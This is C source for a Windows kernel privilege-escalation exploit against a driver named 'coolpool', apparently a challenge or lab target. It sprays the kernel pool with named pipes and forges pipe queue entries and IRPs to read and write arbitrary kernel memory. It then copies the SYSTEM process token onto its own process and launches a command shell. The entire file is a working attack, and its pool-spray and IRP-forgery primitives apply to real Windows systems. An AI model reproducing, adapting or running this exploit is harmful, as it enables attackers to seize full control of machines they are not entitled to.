#include "Header.h"
//#include<stdio.h>
#define MAX_POOL 199
struct NamedType {
    HANDLE Write;
    HANDLE Read;
};
struct NamedType NamedPipeArray[200];
struct NamedType NamedPipeSpray[200];
ULONG64 irp_addr_saved;
char* user_space;
IRP* leakIrp;
int leakPipe;
UCHAR* user_space_kernelbase;
DATA_QUEUE_ENTRY g_queue_entry;
char is_first_write = 1;
int indexblacklist = 0;
ULONG64  blacklistIRP[100] = { 0 };
int offset_leak = 192 * 6;
UCHAR irp_data_saved[0x2000];
ULONG64 CCB_entry_corrupt_saved = 0;
NTFSCONTROLFILE NtFsControlFile = (NTFSCONTROLFILE)GetProcAddress(LoadLibrary(L"ntdll.dll"), "NtFsControlFile");
DWORD(WINAPI* _NtQuerySystemInformation)(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength);
ULONG64 des_token, src_token;
bool isBlacklist(ULONG64 inIrp) {
    for (int i = 0; i < 10; i++)
        if (inIrp != NULL && inIrp > 0xffffffff && inIrp == blacklistIRP[i])
            return true;
    return false;
}
void create_node(HANDLE hDevice,unsigned char *a,int len) {
   
    if (hDevice == INVALID_HANDLE_VALUE)
    {
        printf("Failed to get handel\n");
        return ;
    }


    DWORD bytesReturned;
    char out[100];
    BOOL success = DeviceIoControl(hDevice, 0x222000, a, len, out, NULL, (&bytesReturned), NULL);
}
void edit_node(HANDLE hDevice, unsigned char* a, int len) {

   
    DWORD bytesReturned;
    char out[100];
    BOOL success = DeviceIoControl(hDevice, 0x222004, a, len, out, NULL, (&bytesReturned), NULL);

}
HANDLE delete_node(HANDLE hDevice) {

    DWORD bytesReturned;
    char out[100];
    char a[] = "aaaaaaaaaaaaaaaaaaaa";
    BOOL success = DeviceIoControl(hDevice, 0x22200C, a, strlen(a), out, NULL, (&bytesReturned), NULL);

    return hDevice;
}

NamedType create_np() {
    NamedType cur_np;
    cur_np.Write = CreateNamedPipe(
        L"\\\\.\\pipe\\Pipe",
        PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED,
        PIPE_TYPE_BYTE | PIPE_WAIT,
        PIPE_UNLIMITED_INSTANCES,
        (1024 * 16),
        (1024 * 16),
        NMPWAIT_USE_DEFAULT_WAIT,
        0);
    cur_np.Read = CreateFile(L"\\\\.\\pipe\\Pipe", GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, 0);
    return cur_np;
}

IRP* craft_irp_leak(BYTE* s, PVOID64 address, ULONG leakSize, ULONG64 list_entry_user) {


    DATA_QUEUE_ENTRY* entry = (DATA_QUEUE_ENTRY*)malloc(sizeof(DATA_QUEUE_ENTRY));
    ZeroMemory(entry, sizeof(DATA_QUEUE_ENTRY));

    //entry 1
    entry->DataSize = offset_leak;
    entry->Blink = entry->Flink = list_entry_user;
    BYTE* target = s;
    entry->Irp = NULL;
    entry->EntryType = Buffered;
    memcpy(target, entry, sizeof(DATA_QUEUE_ENTRY));
    free(entry);

    //entry 2 
    entry = (DATA_QUEUE_ENTRY*)list_entry_user;
    IRP* my_irp = (IRP*)malloc(sizeof(IRP));

    ZeroMemory(entry, sizeof(DATA_QUEUE_ENTRY));
    ZeroMemory(my_irp, sizeof(IRP));

    my_irp->AssociatedIrp = address; // data want read
    entry->Irp = uint64_t(my_irp);
    entry->EntryType = Unbuffered;
    entry->DataSize = leakSize;
    blacklistIRP[indexblacklist++] = entry->Irp;
    return my_irp;

}

void leakMem(ULONG64 addr,int len, UCHAR* out) {
 
    UCHAR* target = (UCHAR*)user_space + 0x1000;
    DWORD nbyteread = 0,remain = 0;
    ZeroMemory(target, 0x2000);
    leakIrp->AssociatedIrp = PVOID64(addr);
    PeekNamedPipe(NamedPipeArray[leakPipe].Read, target, offset_leak + len, &nbyteread, &remain, NULL);
    memcpy(out, target + offset_leak, len);
}
ULONG64 GetProcessById(uint64_t first_process, uint64_t pid) {
    uint64_t current_pid = 0;
    uint64_t current_process = first_process;
    char data[0x1000];
    memset(data, 0x0, 0x1000);
    while (1) {
        leakMem(ULONG64(current_process + PID_OFFSET), 0x8, (UCHAR*)&current_pid);
        if (current_pid == pid)
            return current_process;

        leakMem(ULONG64(current_process + ACTIVELINKS_OFFSET), 0x8, (UCHAR*)&current_process);
        current_process -= PID_OFFSET + 0x8;
        if (current_process == first_process)
            return 0;
    }
}

void heap_spray() {
    printf("[+]Spraying NPFS\n");
    DWORD resultLength;
    char str[4096];

    for (int i = 0; i < MAX_POOL; i++) {
        memset(str, 1 + i & 0xff, 4096);
        NamedPipeSpray[i] = create_np();
        WriteFile(NamedPipeSpray[i].Write, str, 192 - 0x40, &resultLength, NULL);
    }

    for (int i = 0; i < MAX_POOL; i += 2) {
        resultLength = 0;
        ReadFile(NamedPipeSpray[i].Read, str, 192 - 0x40, &resultLength, NULL);// Read Pipe to free 
        CloseHandle(NamedPipeSpray[i].Write);
        NamedPipeSpray[i].Write = NULL;
        NamedPipeSpray[i].Read = NULL;
    }

}
ULONG64 leakNewCCB() {
    printf("[+]Entry %llx %llx\n", g_queue_entry.Flink, g_queue_entry.Blink);

    if (g_queue_entry.Flink != g_queue_entry.Blink && g_queue_entry.Flink > 0) {
        printf("[-]Failed to create Hole\n");
        return NULL;
    }

    ULONG64 CcbBase, stop, ret_value = 0;
    LIST_ENTRY64 ccb_entry;
    int max;
    CcbBase = g_queue_entry.Flink - 0xA8;
    leakMem(ULONG64(CcbBase + 0x18), 0x10, (UCHAR*)&ccb_entry);

    max = 0;
    stop = ccb_entry.Blink;
    int list_dq[2] = { 0x48, 0xa8 };

    while (max++ < 5000) {
        //printf("[+]Leaked LIST_ENTRY %llx %llx\n", ccb_entry.Flink, ccb_entry.Blink);
        max++;
        DATA_QUEUE_ENTRY data_queue_entry;
        NP_DATA_QUEUE data_queue;
        ULONG64 stop_entry;
        for (int count = 0; count < 2; count++) {
            leakMem(ULONG64(ccb_entry.Flink - 0x18 + list_dq[count]), sizeof(NP_DATA_QUEUE), (UCHAR*)&data_queue);
            stop_entry = ccb_entry.Flink - 0x18 + list_dq[count];
            int max_iter = 0;
            while (stop_entry && max_iter < 100) {
                max_iter++;
                leakMem(ULONG64(data_queue.Queue.Flink), sizeof(DATA_QUEUE_ENTRY), (UCHAR*)&data_queue_entry);

                if (data_queue_entry.Flink == data_queue_entry.Blink && data_queue_entry.Flink == ULONG64(user_space)) {
                    printf("[+]Detect CCB %llx\n", ccb_entry.Flink);
                    return ccb_entry.Flink;
                }
                if (stop_entry == data_queue_entry.Flink
                    || (data_queue_entry.Flink < 0xffffffff && data_queue_entry.Blink < 0xffffffff)) stop_entry = NULL;
            };
        };

        leakMem(ULONG64(ccb_entry.Flink), 0x10, (UCHAR*)&ccb_entry);
        if (ccb_entry.Flink == stop) break;
    }


    return NULL;
}
ULONG64 leakNewIrp() {
    printf("[+]Entry %llx %llx\n", g_queue_entry.Flink, g_queue_entry.Blink);

    if (g_queue_entry.Flink != g_queue_entry.Blink && g_queue_entry.Flink > 0) {
        printf("[-]Failed to create Hole\n");
        return NULL;
    }

    ULONG64 CcbBase, stop, ret_value = 0;
    LIST_ENTRY64 ccb_entry;
    int max;
    CcbBase = g_queue_entry.Flink - 0xA8;
    leakMem(ULONG64(CcbBase + 0x18), 0x10, (UCHAR*)&ccb_entry);
        
    max = 0;
    stop = ccb_entry.Blink;
    int list_dq[2] = { 0x48, 0xa8 };

    while (max++ < 5000) {
        max++;
        DATA_QUEUE_ENTRY data_queue_entry;
        NP_DATA_QUEUE data_queue;
        ULONG64 stop_entry;
        for (int count = 0; count < 2; count++) {
            leakMem(ULONG64(ccb_entry.Flink - 0x18 + list_dq[count]), sizeof(NP_DATA_QUEUE), (UCHAR*)&data_queue);
            stop_entry = ccb_entry.Flink - 0x18 + list_dq[count];
            int max_iter = 0;
            while (stop_entry && max_iter < 100) {
                max_iter++;
                leakMem(ULONG64(data_queue.Queue.Flink), sizeof(DATA_QUEUE_ENTRY), (UCHAR*)&data_queue_entry);
                
                if (data_queue_entry.EntryType == Unbuffered && !isBlacklist(data_queue_entry.Irp) && data_queue_entry.Irp > 0xFFFFFFFF) {
                    printf("[+]Detect Irp : %llx\n", data_queue_entry.Irp);
                    return data_queue_entry.Irp;
                }
                if (stop_entry == data_queue_entry.Flink
                    || (data_queue_entry.Flink < 0xffffffff && data_queue_entry.Blink < 0xffffffff)) stop_entry = NULL;
            };
        };

        leakMem(ULONG64(ccb_entry.Flink), 0x10, (UCHAR*)&ccb_entry);
        if (ccb_entry.Flink == stop) break;
    }


    return NULL;
}
void craft_irp_write(IRP* copied_irp, ULONG64 destination, ULONG64 source, int size, ULONG64 thread_list) {
    copied_irp->Flags = IRP_INPUT_OPERATION | IRP_BUFFERED_IO;
    copied_irp->Cancel = NULL;
    //copied_irp->CancelRoutine = NULL;
    copied_irp->UserBuffer = PVOID64(destination);
    copied_irp->AssociatedIrp = PVOID64(source);
    copied_irp->IoStatus[2] = size;
    copied_irp->ThreadListEntry.Flink = thread_list;
    copied_irp->ThreadListEntry.Blink = thread_list;

}
void craft_write_entry(ULONG64 forge_irp, ULONG sz) {
    DATA_QUEUE_ENTRY* entry = (DATA_QUEUE_ENTRY*)user_space;
    entry->Blink = entry->Flink = leakNewCCB() - 0x18 + 0xa8 ;
    entry->EntryType = Buffered;
    entry->QuotaInEntry = sz - 1;
    entry->DataSize = sz;
    entry->Irp = ULONG64(forge_irp);
}
void GetToken() {
    IRP irp_obj = *(IRP*)irp_data_saved;
    ULONG64 addr = 0;
    leakMem(ULONG64(irp_obj.ThreadListEntry.Flink + 0x38), 8, (UCHAR*)&addr);
    leakMem(ULONG64(addr-0x2c8), 8, (UCHAR*)&addr);
    ULONG64 current_proc = addr;
    printf("Current Process : %llx\n",current_proc);
    des_token = GetProcessById(current_proc, GetCurrentProcessId()) + 0x4b8;
    src_token = GetProcessById(current_proc, 4) + 0x4b8;
}
void LPE() {
    // Implement Write method
    char irp_copied[0x2000];
    IO_STATUS_BLOCK isb;
    ULONG64 forge_irp, addr_irp_copied, thread_list[2];
    NamedType for_fake, push_up;
    ULONG64 ccb_entry_of_corrupt;
    ZeroMemory(&isb, sizeof(isb));
    memset(irp_copied, 0x61, 0x2000);
    for_fake = create_np();
    NtFsControlFile(for_fake.Write, 0, 0, 0, &isb, FSCTL_PIPE_INTERNAL_WRITE, irp_copied, 0x1000, 0, 0);
    addr_irp_copied = leakNewIrp();
    blacklistIRP[indexblacklist++] = addr_irp_copied;
    irp_addr_saved = addr_irp_copied;
    leakMem(ULONG64(addr_irp_copied), 0x1000, (UCHAR*)irp_copied);
    memcpy(irp_data_saved, irp_copied, 0x1000);
    GetToken();

    craft_irp_write((IRP*)irp_copied, des_token,src_token, 8, ULONG64(thread_list));
    push_up = create_np();
    NtFsControlFile(push_up.Write, 0, 0, 0, &isb, FSCTL_PIPE_INTERNAL_WRITE, irp_copied, 0x1000, 0, 0);
    /*
           Now, its will be in IRP->AssocatedIrp
           i 'll find it
       */
    addr_irp_copied = leakNewIrp();
    blacklistIRP[indexblacklist++] = addr_irp_copied;
    leakMem(ULONG64(addr_irp_copied + offsetof(IRP, AssociatedIrp)), 8, (UCHAR*)&forge_irp);
    printf("[+]forge IRP : %llx\n", forge_irp);
    thread_list[0] = thread_list[1] = forge_irp + offsetof(IRP, ThreadListEntry.Flink);
    craft_write_entry( forge_irp, 8);
    DWORD BytesReturned = 0;
    BYTE bufRead[0x80];
    ReadFile(NamedPipeArray[leakPipe].Read, bufRead, 1, &BytesReturned, 0);
}


int main(int argc, char* argv[])
{

    DWORD resultLength;
    char str[4096];
    char test[] = "hacker";
    unsigned char buffer_pointer[1024];
    memset(&g_queue_entry, 0, sizeof(DATA_QUEUE_ENTRY));
    heap_spray();
    user_space = (char*)VirtualAlloc(NULL, 0x10000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    user_space_kernelbase = (UCHAR*)user_space + 0x5000;
    if (user_space == NULL) {
        printf("failed to create user space : %lx\n", user_space);
        return 1;
    }
   
    HANDLE hDevice = CreateFile(L"\\\\.\\coolpool", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

    memset(buffer_pointer, 0x61, 184);
    *((DWORD*)buffer_pointer + 1) = 176;
    create_node(hDevice,buffer_pointer, 184);
    memset(buffer_pointer, 0x61, 184);
    edit_node(hDevice,buffer_pointer, 200); //free chunk 176

    printf("[+]Spraying Heap NamedPipe\n");
    for (int i = 0; i < MAX_POOL - 100; i++) {
        memset(str, 1 + i & 0xff, 4096);
        NamedPipeArray[i] = create_np();
        WriteFile(NamedPipeArray[i].Write, str, 192 - 0x40, &resultLength, NULL);
    }
    delete_node(hDevice); // freed NamedPipe Object 
    printf("[+]Spray CoolPool\n");
    memset(buffer_pointer, 0xCC, 184);
    *(DWORD*)buffer_pointer = 0;
    *((DWORD*)buffer_pointer + 1) = 176;

    leakIrp = craft_irp_leak(buffer_pointer + 8, PVOID64(test), 0x1000, ULONG64(user_space));

    for (int i = 0; i < MAX_POOL - 100; i++) {
        create_node(hDevice,buffer_pointer, 184);
    }
    
    UCHAR* tmp = (UCHAR*)user_space + 0x1000;
    if (tmp == NULL) {
        printf("[-]failed to allocate\n");
        return 0;
    }
    

    for (int i = 0; i < MAX_POOL - 100; i++) {
        DWORD byte_read = 0;
        DWORD remain = 0;
        memset(tmp, 0, 0x1000);
        if (NamedPipeArray[i].Read)
        {
            PeekNamedPipe(NamedPipeArray[i].Read, tmp, offset_leak + 6, &byte_read, &remain, NULL);
            if (byte_read > 0 && strncmp((const char*)tmp + offset_leak, test, 6) == 0){
                printf("[leaked] ==> %s\n", tmp + offset_leak);
                g_queue_entry.Flink = *(ULONG64*)(tmp + 144);
                g_queue_entry.Blink = *(ULONG64*)(tmp + 144 + 8);
                printf("Entry %llx %llx\n", g_queue_entry.Flink, g_queue_entry.Blink);
                leakPipe = i;
                break;
            }
        }
    }
    if (g_queue_entry.Flink != g_queue_entry.Blink && g_queue_entry.Flink > 0) {
        printf("[-]Failed to create Hole\n");
        return NULL;
    }

    LPE();
    printf("write sucesss\n");
    system("cmd");

    return 0;
}
